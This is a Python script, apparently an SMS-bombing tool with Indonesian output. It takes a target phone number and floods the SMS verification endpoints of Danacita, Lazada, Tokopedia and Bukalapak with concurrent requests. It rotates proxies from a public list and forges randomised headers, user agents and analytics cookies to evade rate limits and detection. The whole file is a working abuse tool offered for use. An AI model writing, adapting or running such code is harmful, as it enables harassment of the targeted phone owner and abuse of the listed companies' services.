import requests
import json
import time
import random
import uuid
import logging
from colorama import Fore, init
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
import aiohttp
import asyncio

init(autoreset=True)

# Set up logging
logging.basicConfig(filename='spam_sms.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define colorama colors
BlueTerm = Fore.BLUE
WhiteTerm = Fore.WHITE
RedTerm = Fore.RED
GreenTerm = Fore.GREEN
YellowTerm = Fore.YELLOW

hijau = "\033[1;92m"
putih = "\033[1;97m"
biru = "\033[1;96m"
kuning = "\033[1;93m"

def generate_user_agent():
    browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera']
    os = ['Windows', 'Macintosh', 'Linux', 'Android', 'iOS']
    browser_version = random.randint(50, 90)
    os_version = random.randint(10, 15)
    return f"Mozilla/5.0 ({random.choice(os)} NT {os_version}.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(browsers)}/{browser_version}.0.4472.124 Safari/537.36"

def generate_accept_language():
    languages = ['en-US', 'id-ID', 'es-ES', 'zh-CN', 'ms-MY', 'ca-ES', 'pt-BR']
    random.shuffle(languages)
    return ','.join([f"{lang};q={round(random.uniform(0.1, 1.0), 1)}" for lang in languages])

def generate_cookie():
    return f"perf_dv6Tr4n={random.randint(1, 10)}; _gcl_au=1.1.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; amp_9bff24={uuid.uuid4()}...1i0tkmf66.1i0tkmf66.0.0.0; _gid=GA1.3.{random.randint(100000000, 999999999)}.{random.randint(1000000000, 1999999999)}; _gat_UA-106864485-1=1; _fbp=fb.2.{random.randint(1000000000, 1999999999)}.{random.randint(1000000000000, 1999999999999)}; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-20881%2C180.244.163.61%2C1%2Cf1f6b29a6cc1f79a0fea05b885aa33d0%2CChrome%2CID; _ga_M6EGHSCWF7=GS1.1.{random.randint(1000000000, 1999999999)}.1.0.{random.randint(1000000000, 1999999999)}.57.0.0; ph_phc_3JD9yqRALGfavssFolNlgAlqrFJxXWoSMRypaScrcHv_posthog=%7B%22distinct_id%22%3A%22{uuid.uuid4()}%22%2C%22%24sesid%22%3A%5B{random.randint(1000000000, 1999999999)}%2C%22{uuid.uuid4()}%22%2C{random.randint(1000000000, 1999999999)}%5D%7D; _ga=GA1.1.{random.randint(1000000000, 1999999999)}; cebsp_=2; _ga_V9673QHFM5=GS1.1.{random.randint(1000000000, 1999999999)}.1.1.{random.randint(1000000000, 1999999999)}.38.0.0; _ce.s=v~26dae470825c19828984ea7d7dbfd066418b156c~lcw~{random.randint(1000000000, 1999999999)}~lva~{random.randint(1000000000, 1999999999)}~vpv~0~as~false~v11.fhb~{random.randint(1000000000, 1999999999)}~v11.lhb~{random.randint(1000000000, 1999999999)}~v11.cs~{random.randint(100000, 999999)}~v11.s~{uuid.uuid4()}~gtrk.la~lxotc4r2~v11.sla~{random.randint(1000000000, 1999999999)}~lcw~{random.randint(1000000000, 1999999999)}"

def generate_sec_ch_ua():
    brands = ['Not/A)Brand', 'Chromium', 'Google Chrome', 'Microsoft Edge', 'Safari']
    versions = [str(random.randint(70, 130)) for _ in range(3)]
    return f"\"{random.choice(brands)}\";v=\"{versions[0]}\", \"{random.choice(brands)}\";v=\"{versions[1]}\", \"{random.choice(brands)}\";v=\"{versions[2]}\""

def generate_sec_ch_ua_platform():
    platforms = ['Windows', 'macOS', 'Linux', 'Android', 'iOS']
    return f"\"{random.choice(platforms)}\""

def generate_headers(api_name):
    return {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": generate_accept_language(),
        "Content-Length": str(random.randint(20, 50)),  # Random content length
        "Content-Type": "application/json",
        "Cookie": generate_cookie(),
        "Origin": "https://app.danacita.co.id",
        "Referer": f"https://app.danacita.co.id/{random.choice(['home', 'login', 'register'])}",
        "Sec-Ch-Ua": generate_sec_ch_ua(),
        "Sec-Ch-Ua-Mobile": f"?{random.randint(0, 1)}",
        "Sec-Ch-Ua-Platform": generate_sec_ch_ua_platform(),
        "Sec-Fetch-Dest": random.choice(["empty", "document", "iframe"]),
        "Sec-Fetch-Mode": random.choice(["cors", "navigate", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["same-site", "same-origin", "cross-site"]),
        "User-Agent": generate_user_agent()
    }

async def send_request(api_url, headers, data, session, proxy=None, retry_attempts=3, initial_delay=2):
    for attempt in range(retry_attempts):
        try:
            async with session.post(api_url, headers=headers, data=data, proxy=proxy) as response:
                if response.status == 200:
                    logging.info(f"Berhasil mengirim SMS via {api_url} - Attempt {attempt + 1}")
                    print(f"{GreenTerm}Berhasil mengirim SMS via {api_url}")
                    return True
                else:
                    logging.warning(f"Gagal mengirim SMS via {api_url}. Status code: {response.status} - Attempt {attempt + 1}")
        except Exception as e:
            logging.error(f"Terjadi kesalahan: {e} - Attempt {attempt + 1}")
        
        # Delay dengan backoff eksponensial
        await asyncio.sleep(initial_delay * (2 ** attempt))
    
    print(f"{RedTerm}Gagal mengirim SMS setelah {retry_attempts} kali percobaan.")
    return False

async def fetch_proxies():
    proxy_source_url = "https://www.proxy-list.download/api/v1/get?type=https"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(proxy_source_url) as response:
                if response.status == 200:
                    proxy_list = await response.text()
                    return proxy_list.splitlines()
    except Exception as e:
        logging.error(f"Terjadi kesalahan saat mengambil daftar proxy: {e}")
    return []

async def main():
    # Input nomor
    inputNomer = input(f"{WhiteTerm}[{RedTerm}• {kuning}•{hijau}•{WhiteTerm}] {biru}Nomor Target (ex: +628xxx){WhiteTerm}: ")    

    # API endpoints
    api_endpoints = {
        "Danacita": "https://api.danacita.co.id/v4/users/mobile_register/",
        "Lazada": "https://api.lazada.co.id/v1/sms/verify/",
        "Tokopedia": "https://api.tokopedia.com/v1/sms/verification/",
        "Bukalapak": "https://api.bukalapak.com/v1/sms/verification/"
    }

    # Parallel processing parameters
    num_threads = 20
    proxy_list = await fetch_proxies()
    proxies = cycle(proxy_list) if proxy_list else cycle([])

    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(num_threads):
            for api_name, api_url in api_endpoints.items():
                proxy = next(proxies, None)
                task = asyncio.ensure_future(send_request(api_url, generate_headers(api_name), json.dumps({"username": inputNomer}), session, proxy))
                tasks.append(task)
        
        # Execute tasks concurrently
        await asyncio.gather(*tasks)

# Run the main function
asyncio.run(main())
